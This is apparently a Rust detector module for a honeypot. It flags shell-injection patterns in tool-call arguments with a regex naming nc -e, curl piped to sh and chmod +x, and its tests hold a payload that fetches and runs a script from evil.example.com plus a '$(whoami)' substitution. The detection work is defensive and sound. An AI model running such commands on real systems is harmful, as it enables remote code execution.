//! Shell / command injection heuristic.
//!
//! Flags tool arguments that contain shell metacharacters or common exec patterns
//! attackers use when they believe the target pipes arguments to a shell. Does not
//! try to be sound — false positives are fine on a honeypot because every match is
//! a useful datapoint about what attackers *attempted*.

use regex::Regex;
use std::sync::OnceLock;

use crate::detect::{Detection, DetectionCategory, DetectionContext, Detector, Severity};

pub struct ShellInjectionDetector;

fn pattern() -> &'static Regex {
    static R: OnceLock<Regex> = OnceLock::new();
    R.get_or_init(|| {
        Regex::new(
            r#"(?x)
            (
                # classic shell-escape constructs
                \$\(                                 # $(...)
              | `[^`]*`                              # backticks
              | ;\s*(rm|curl|wget|bash|sh|nc|cat)    # ; rm, ; curl, ...
              | \|\s*(sh|bash|zsh|curl|wget|nc)      # pipe-into-shell
              | \&\&\s*(rm|curl|wget|bash|sh)        # && chained
              | \|\|\s*(rm|curl|wget|bash|sh)        # || chained
              | >\s*/tmp/                            # redirect to /tmp
              | \bcurl\b[^\n]{0,60}\|\s*(sh|bash)    # curl ... | sh
              | \bnc\s+-\w*e                         # nc -e shell
              | \bchmod\s+\+x\b                      # chmod +x
              | \beval\(                             # eval()
            )
            "#,
        )
        .expect("shell injection regex")
    })
}

impl Detector for ShellInjectionDetector {
    fn name(&self) -> &'static str {
        "shell_injection_patterns"
    }

    fn category(&self) -> DetectionCategory {
        DetectionCategory::CommandInjection
    }

    fn analyze(&self, ctx: &DetectionContext) -> Option<Detection> {
        let params = ctx.entry.params.as_ref()?;
        let body = params.to_string();
        let m = pattern().find(&body)?;
        let start = m.start().saturating_sub(16);
        let end = (m.end() + 16).min(body.len());
        let excerpt = &body[start..end];
        Some(Detection {
            detector: "shell_injection_patterns",
            category: DetectionCategory::CommandInjection,
            severity: Severity::High,
            evidence: excerpt.to_string(),
            notes: Some(format!("method={}", ctx.entry.method)),
        })
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::detect::testing::{ctx, make_entry};
    use crate::detect::SessionStats;
    use serde_json::json;

    #[test]
    fn triggers_on_curl_pipe_sh() {
        let s = SessionStats::default();
        let e = make_entry(
            "tools/call",
            json!({"name":"exec","arguments":{"cmd":"curl http://evil.example.com/x.sh | sh"}}),
        );
        assert!(ShellInjectionDetector.analyze(&ctx(&e, &s)).is_some());
    }

    #[test]
    fn triggers_on_dollar_parens() {
        let s = SessionStats::default();
        let e = make_entry(
            "tools/call",
            json!({"name":"run","arguments":{"x":"hello $(whoami)"}}),
        );
        assert!(ShellInjectionDetector.analyze(&ctx(&e, &s)).is_some());
    }

    #[test]
    fn negative_plain_string() {
        let s = SessionStats::default();
        let e = make_entry(
            "tools/call",
            json!({"name":"query","arguments":{"sql":"SELECT name FROM users WHERE id = 7"}}),
        );
        assert!(ShellInjectionDetector.analyze(&ctx(&e, &s)).is_none());
    }
}
